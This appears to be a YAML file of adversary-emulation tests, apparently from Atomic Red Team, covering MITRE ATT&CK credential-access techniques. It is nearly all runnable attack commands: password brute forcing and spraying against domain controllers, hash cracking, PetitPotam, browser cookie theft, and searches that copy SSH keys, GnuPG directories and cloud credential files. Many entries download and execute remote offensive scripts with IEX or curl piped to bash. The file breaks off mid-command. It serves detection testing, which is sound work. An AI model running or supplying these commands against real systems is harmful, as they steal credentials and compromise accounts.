          Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
          exit 1
        }

        [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389)

        $passwordList = Get-Content -Path "PathToAtomicsFolder\T1110.001\src\passwords.txt"
        foreach ($password in $passwordList){
          $credz = new-object System.Net.NetworkCredential("$ENV:USERNAME", $password, "$env:UserDnsDomain")
          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
          try {
            Write-Host " [-] Attempting ${password} on account $ENV:USERNAME."
            $conn.bind()
            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
            Write-Host " [!] $ENV:USERNAME:${password} are valid credentials!"
          } catch {
            Write-Host $_.Exception.Message
          }
        }
        Write-Host "End of bruteforce"
      timeout: 120
    - name: Password Brute User using Kerbrute Tool
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        .\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1
      timeout: 120
    - name: SUDO Brute Force - Debian
      type: bash
      platform: linux
      command: |-
        useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
        su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
      cleanup: userdel -fr art
      timeout: 60
      elevation_required: true
    - name: SUDO Brute Force - Redhat
      type: bash
      platform: linux
      command: |-
        useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
        su art
        cd /tmp
        curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash
      cleanup: userdel -fr art
      timeout: 60
      elevation_required: true
    - name: SUDO Brute Force - FreeBSD
      type: bash
      platform: linux
      command: |-
        pw adduser art -g wheel -s /bin/sh
        echo "password123" | pw usermod art -h 0
        su art
        cd /tmp
        curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash
      cleanup: rmuser -y art
      timeout: 60
      elevation_required: true
    - name: ESXi - Brute Force Until Account Lockout
      type: powershell
      platform: windows
      command: |-
        $lockout_threshold = [int]"5"
        for ($var = 1; $var -le $lockout_threshold; $var++) {
          PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh "atomic.local" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
          }
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1110/001
  is_safe: false
- id: T1110.002
  name: Password Cracking
  description: Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/t...
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Password Cracking with Hashcat
      type: cmd
      platform: windows
      command: |-
        cd PathToAtomicsFolder\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..
        PathToAtomicsFolder\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule PathToAtomicsFolder\T1110.002\src\sam.txt PathToAtomicsFolder\T1110.002\src\password.lst
      cleanup: |-
        del "PathToAtomicsFolder\..\ExternalPayloads\hashcat6.7z" >nul 2>&1
        del "PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe" >nul 2>&1
        del "PathToAtomicsFolder\..\ExternalPayloads\7z" /Q /S >nul 2>&1
        del "PathToAtomicsFolder\..\ExternalPayloads\hashcat-unzip" /Q /S >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1110/002
  is_safe: false
- id: T1110.003
  name: Password Spraying
  description: Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (C...
  tactic: credential-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Password Spray all Domain Users
      type: cmd
      platform: windows
      command: '@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL'
      timeout: 120
    - name: Password Spray (DomainPasswordSpray)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force
      timeout: 120
    - name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)
      type: powershell
      platform: windows
      command: |-
        if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
          Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
          exit 1
        }

        $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName

        [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389)

        $DomainUsers | Foreach-Object {
          $user = $_
          $password = 'P@ssw0rd!'

          $credz = new-object System.Net.NetworkCredential($user, $password, "$env:UserDnsDomain")
          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
          try {
            Write-Host " [-] Attempting ${password} on account ${user}."
            $conn.bind()
            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
            Write-Host " [!] ${user}:${password} are valid credentials!"
          } catch {
            Write-Host $_.Exception.Message
          }
        }
        Write-Host "End of password spraying"
      timeout: 120
    - name: WinPwn - DomainPasswordSpray Attacks
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        domainpassspray -consoleoutput -noninteractive -emptypasswords
      timeout: 120
    - name: Password Spray Invoke-DomainPasswordSpray Light
      type: powershell
      platform: windows
      command: |-
        function Invoke-dpsLight ($Password, $userlist) {
        $users = Get-Content $userlist
        $Domain = "LDAP://" + ([ADSI]"").distinguishedName
        foreach ($User in $users) {
          $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
          if ($Domain_check.name -ne $null) {
            Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
          }
          else { Write-Host ". " -NoNewline}
        }
        Write-Host -ForegroundColor green "Finished"
        }
        Invoke-dpsLight "Spring2020" $env:Temp\usersdpsLight.txt
      timeout: 120
    - name: Password Spray using Kerbrute Tool
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        .\kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt" password132
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1110/003
  is_safe: false
- id: T1110.004
  name: Credential Stuffing
  description: |-
    Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.

    Cred...
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: SSH Credential Stuffing From Linux
      type: bash
      platform: linux
      command: |-
        cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
      timeout: 60
    - name: SSH Credential Stuffing From MacOS
      type: bash
      platform: macos
      command: |-
        cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
      timeout: 60
    - name: SSH Credential Stuffing From FreeBSD
      type: sh
      platform: linux
      command: |-
        cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
      timeout: 60
    - name: Brute Force:Credential Stuffing using Kerbrute Tool
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        .\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1110/004
  is_safe: false
- id: T1187
  name: Forced Authentication
  description: |-
    Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

    The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the curren...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: PetitPotam
      type: powershell
      platform: windows
      command: |-
        & "PathToAtomicsFolder\..\ExternalPayloads\PetitPotam.exe" 10.0.0.3 10.0.0.2 1
        Write-Host "End of PetitPotam attack"
      timeout: 120
    - name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
        Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
      timeout: 120
    - name: Trigger an authenticated RPC call to a target server with no Sign flag set
      type: powershell
      platform: windows
      command: rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1187
  is_safe: false
- id: T1539
  name: Steal Web Session Cookie
  description: |-
    An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

    Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in n...
  tactic: credential-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Steal Firefox Cookies (Windows)
      type: powershell
      platform: windows
      command: |-
        stop-process -name "firefox" -force -erroraction silentlycontinue
        $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
        "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe "$CookieDBLocation" | out-file -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt"
      cleanup: remove-item PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt -erroraction silentlycontinue
      timeout: 120
    - name: Steal Chrome Cookies (Windows)
      type: powershell
      platform: windows
      command: |-
        stop-process -name "chrome" -force -erroraction silentlycontinue
        "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe "$env:localappdata\Google\Chrome\User Data\Default\Network\Cookies" | out-file -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt"
      cleanup: remove-item PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt
      timeout: 120
    - name: Steal Chrome Cookies via Remote Debugging (Mac)
      type: bash
      platform: macos
      command: |-
        killall 'Google Chrome'
        sleep 1
        open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
        sleep 1
        /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
      cleanup: rm -rf /tmp/WhiteChocolateMacademiaNut
      timeout: 60
    - name: Steal Chrome v127+ cookies via Remote Debugging (Windows)
      type: powershell
      platform: windows
      command: |-
        $devToolsPort = 9222
        $testUrl = "https://www.google.com"
        stop-process -name "chrome" -force -erroraction silentlycontinue
        $chromeProcess = Start-Process "chrome.exe" "$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default" -PassThru
        Start-Sleep 10
        $jsonResponse = Invoke-WebRequest "http://localhost:$devToolsPort/json" -UseBasicParsing
        $devToolsPages = ConvertFrom-Json $jsonResponse.Content
        $ws_url = $devToolsPages[0].webSocketDebuggerUrl
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $uri = New-Object System.Uri($ws_url)
        $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
        $GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
        $segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
        $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
        $completeMessage = New-Object System.Text.StringBuilder
        do {
            $receivedBuffer = New-Object byte[] 2048
            $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
            $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
            $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
            $completeMessage.Append($receivedString)
        } while (-not $result.EndOfMessage)
        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()
        try {
            $response = ConvertFrom-Json $completeMessage.ToString()
            $cookies = $response.result.cookies
        } catch {
            Write-Host "Error parsing JSON data."
        }
        Write-Host $cookies
        Stop-Process $chromeProcess -Force
      timeout: 120
    - name: Copy Safari BinaryCookies files using AppleScript
      type: sh
      platform: macos
      command: osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "/private/tmp"' -e 'set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")' -e 'duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'
      cleanup: rm "/private/tmp/Cookies.binarycookies"
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1539
  is_safe: false
- id: T1552
  name: Unsecured Credentials
  description: Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Shell History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/...
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: AWS - Retrieve EC2 Password Data using stratus
      type: sh
      platform: linux
      command: "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1552/src\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force"
      cleanup: |-
        export AWS_REGION=us-west-2
        echo "Cleanup detonation"
        cd $PathToAtomicsFolder/T1552/src
        ./stratus cleanup --all
        rm -rf stratus*
      timeout: 60
    - name: AWS - Retrieve EC2 Password Data using stratus
      type: sh
      platform: macos
      command: "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1552/src\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force"
      cleanup: |-
        export AWS_REGION=us-west-2
        echo "Cleanup detonation"
        cd $PathToAtomicsFolder/T1552/src
        ./stratus cleanup --all
        rm -rf stratus*
      timeout: 60
    - name: Search for Passwords in Powershell History
      type: powershell
      platform: windows
      command: ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String "password", "-p", "key", "pwd", "pass"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1552
  is_safe: false
- id: T1552.001
  name: Credentials In Files
  description: |-
    Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

    It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/tech...
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Find AWS credentials
      type: sh
      platform: macos
      command: find //.aws -name "credentials" -type f 2>/dev/null
      timeout: 60
    - name: Find AWS credentials
      type: sh
      platform: linux
      command: find //.aws -name "credentials" -type f 2>/dev/null
      timeout: 60
    - name: Extract Browser and System credentials with LaZagne
      type: bash
      platform: macos
      command: python2 laZagne.py all
      timeout: 60
      elevation_required: true
    - name: Extract passwords with grep
      type: sh
      platform: linux
      command: |-
        grep -ri password /
        exit 0
      timeout: 60
    - name: Extract passwords with grep
      type: sh
      platform: macos
      command: |-
        grep -ri password /
        exit 0
      timeout: 60
    - name: Extracting passwords with findstr
      type: powershell
      platform: windows
      command: |-
        findstr /si pass *.xml *.doc *.txt *.xls
        ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
      timeout: 120
    - name: Access unattend.xml
      type: cmd
      platform: windows
      command: |-
        type C:\Windows\Panther\unattend.xml
        type C:\Windows\Panther\Unattend\unattend.xml
      timeout: 120
      elevation_required: true
    - name: Find and Access Github Credentials
      type: bash
      platform: linux
      command: for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
      timeout: 60
    - name: Find and Access Github Credentials
      type: bash
      platform: macos
      command: for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
      timeout: 60
    - name: WinPwn - sensitivefiles
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        sensitivefiles -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - Snaffler
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        Snaffler -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - powershellsensitive
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        powershellsensitive -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - passhunt
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        passhunt -local $true -noninteractive
      cleanup: |-
        rm -force .\passhunt.exe -ErrorAction Ignore
        rm -force .\phunter* -ErrorAction Ignore
        rm -force -recurse .\DomainRecon -ErrorAction Ignore
        rm -force -recurse .\Exploitation -ErrorAction Ignore
        rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
        rm -force -recurse .\LocalRecon -ErrorAction Ignore
        rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
      timeout: 120
    - name: WinPwn - SessionGopher
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        sessionGopher -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        SharpCloud -consoleoutput -noninteractive
      timeout: 120
    - name: List Credential Files via PowerShell
      type: powershell
      platform: windows
      command: |-
        $usernameinfo = (Get-ChildItem Env:USERNAME).Value
        Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\
        Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\
      timeout: 120
      elevation_required: true
    - name: List Credential Files via Command Prompt
      type: cmd
      platform: windows
      command: |-
        dir /a:h C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
        dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\
      timeout: 120
      elevation_required: true
    - name: Find Azure credentials
      type: sh
      platform: macos
      command: find //.azure -name "msal_token_cache.json" -o -name "accessTokens.json" -type f 2>/dev/null
      timeout: 60
    - name: Find Azure credentials
      type: sh
      platform: linux
      command: find //.azure -name "msal_token_cache.json" -o -name "accessTokens.json" -type f 2>/dev/null
      timeout: 60
    - name: Find GCP credentials
      type: sh
      platform: macos
      command: find //.config/gcloud -name "credentials.db" -o -name "access_tokens.db" -type f 2>/dev/null
      timeout: 60
    - name: Find GCP credentials
      type: sh
      platform: linux
      command: find //.config/gcloud -name "credentials.db" -o -name "access_tokens.db" -type f 2>/dev/null
      timeout: 60
    - name: Find OCI credentials
      type: sh
      platform: macos
      command: find //.oci/sessions -name "token" -type f 2>/dev/null
      timeout: 60
    - name: Find OCI credentials
      type: sh
      platform: linux
      command: find //.oci/sessions -name "token" -type f 2>/dev/null
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1552/001
  is_safe: false
- id: T1552.002
  name: Credentials in Registry
  description: |-
    Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

    Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credent...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Enumeration for Credentials in Registry
      type: cmd
      platform: windows
      command: |-
        reg query HKLM /f password /t REG_SZ /s
        reg query HKCU /f password /t REG_SZ /s
      timeout: 120
    - name: Enumeration for PuTTY Credentials in Registry
      type: cmd
      platform: windows
      command: reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1552/002
  is_safe: false
- id: T1552.003
  name: Shell History
  description: |-
    Adversaries may search the command history on compromised systems for insecurely stored credentials.

    On Linux and macOS systems, shells such as Bash and Zsh keep track of the commands users type on the command-line with the "history" utility. Once a user logs out, the history is flushed to the user's history file. For each user, this file resides at the same location: for example, `~/.bash_history` or `~/.zsh_history`. Typically, these files keeps track of the user's last 1000 commands.

    On Win...
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Search Through Bash History
      type: sh
      platform: linux
      command: cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
      timeout: 60
    - name: Search Through Bash History
      type: sh
      platform: macos
      command: cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
      timeout: 60
    - name: Search Through sh History
      type: sh
      platform: linux
      command: cat ~/.history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1552/003
  is_safe: false
- id: T1552.004
  name: Private Keys
  description: "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based sy..."
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Private Keys
      type: cmd
      platform: windows
      command: dir c:\ /b /s .key | findstr /e .key
      timeout: 120
      elevation_required: true
    - name: Discover Private SSH Keys
      type: sh
      platform: linux
      command: |-
        find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt
        exit 0
      cleanup: rm /tmp/keyfile_locations.txt
      timeout: 60
    - name: Discover Private SSH Keys
      type: sh
      platform: macos
      command: |-
        find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt
        exit 0
      cleanup: rm /tmp/keyfile_locations.txt
      timeout: 60
    - name: Copy Private SSH Keys with CP
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \;
        exit 0
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
    - name: Copy Private SSH Keys with CP (freebsd)
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec gcp --parents {} /tmp/art-staging \;
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
    - name: Copy Private SSH Keys with rsync
      type: sh
      platform: macos
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
        exit 0
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
    - name: Copy Private SSH Keys with rsync
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
        exit 0
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
    - name: Copy Private SSH Keys with rsync (freebsd)
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
    - name: Copy the users GnuPG directory with rsync
      type: sh
      platform: macos
      command: |-
        mkdir /tmp/GnuPG
        find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
        exit 0
      cleanup: rm -rf /tmp/GnuPG
      timeout: 60
    - name: Copy the users GnuPG directory with rsync
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/GnuPG
        find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
        exit 0
      cleanup: rm -rf /tmp/GnuPG
      timeout: 60
    - name: Copy the users GnuPG directory with rsync (freebsd)
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/GnuPG
        find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
      cleanup: rm -rf /tmp/GnuPG
      timeout: 60
    - name: ADFS token signing and encryption certificates theft - Local
      type: powershell
      platform: windows
      command: |-
        Import-Module AADInternals -Force
        Export-AADIntADFSCertificates
        Get-ChildItem | Where-Object {$_ -like "ADFS*"}
        Write-Host "`nCertificates retrieved successfully"
      cleanup: |-
        Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
        Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
      timeout: 120
    - name: ADFS token signing and encryption certificates theft - Remote
      type: powershell
      platform: windows
      command: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = 